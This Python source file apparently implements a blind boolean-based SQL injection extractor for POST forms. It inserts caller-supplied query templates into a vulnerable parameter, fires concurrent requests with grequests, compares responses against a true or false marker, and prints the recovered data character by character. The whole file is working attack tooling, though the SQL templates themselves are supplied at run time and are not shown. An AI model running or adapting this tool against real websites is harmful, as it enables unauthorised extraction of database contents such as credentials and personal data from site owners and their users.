from datetime import datetime
import grequests as req


class Post():

    def __init__(self, target, vuln_param, params, trucon, falcon, query_list, headers):

        # target
        if target.find('http://') != 0:
            self.target = 'http://'+target
        else:
            self.target = target
        # target

        # params form
        self.params = params
        # params form

        # vuln param
        self.vuln_param = vuln_param
        # vuln param

        # true condition
        self.trucon = trucon
        # true condition

        # false condition
        self.falcon = falcon
        # false condition

        # query list
        self.query_list = query_list
        # query list

        # headers
        self.headers = headers
        # headers

    def execute(self):

        valid = {'start': '', 'end': ''}

        # request
        def request(first, end):

            index = []
            payloads = []

            for i in range(first, end):

                payloads.append(({self.vuln_param: ((query.replace('{@}', str(start))).replace(
                    '{?}', '=')).replace('{$}', str(i))}))
                index.append(i)

            if self.params:

                for i in payloads:

                    i.update(self.params)

            responses = [req.post(self.target, data=payload,
                                  headers=self.headers) for payload in payloads]
            responses = req.map(responses)

            for i, v in enumerate(responses):

                if self.trucon:

                    if self.trucon.strip() in str(v._content):

                        if start == 1:

                            return "|_[+] "+chr(index[i])

                        else:

                            return chr(index[i])

                else:

                    if not self.falcon.strip() in str(v._content):

                        if start == 1:

                            return "|_[+] "+chr(index[i])

                        else:

                            return chr(index[i])
        # request

        # detector
        start_time = datetime.now()

        for query in self.query_list:

            start = 1
            to = 2
            payloads = []

            while start < to:

                if valid['start']:

                    result = request(79, 127)

                    if result == None:

                        print('\n')
                        start += to

                    else:

                        print(result, end='', flush=True)
                    valid = {'start': '', 'end': ''}
                    start += 1
                    to += 1

                elif valid['end']:

                    result = request(32, 80)

                    if result == None:

                        print('\n')
                        start += to

                    else:

                        print(result, end='', flush=True)
                    valid = {'start': '', 'end': ''}
                    start += 1
                    to += 1

                else:

                    payloads = [{self.vuln_param: ((query.replace('{@}', str(start))).replace(
                        '{?}', '>=')).replace('{$}', str(79))}]

                    if self.params:

                        payloads[0].update(self.params)

                    responses = [req.post(
                        self.target, data=payload, headers=self.headers) for payload in payloads]
                    responses = req.map(responses)

                    for i in responses:

                        if self.trucon:

                            if self.trucon.strip() in str(i._content):

                                valid['start'] = 79

                            else:

                                valid['end'] = 79

                        else:

                            if not self.falcon.strip() in str(i._content):

                                valid['start'] = 79

                            else:

                                valid['end'] = 79
        # detector

        # finish
        end_time = datetime.now()
        print('|'.ljust(26, '_'), end='\n|')
        print(''.ljust(25, ' '), end='|\n|')
        print('[ Result ]'.center(25, ' '), end='|\n|')
        print(''.ljust(25, '_'), end='|\n|')
        print(f'\n|_[ Finish ] => {end_time-start_time}'[:-7], '\n')
        # finish
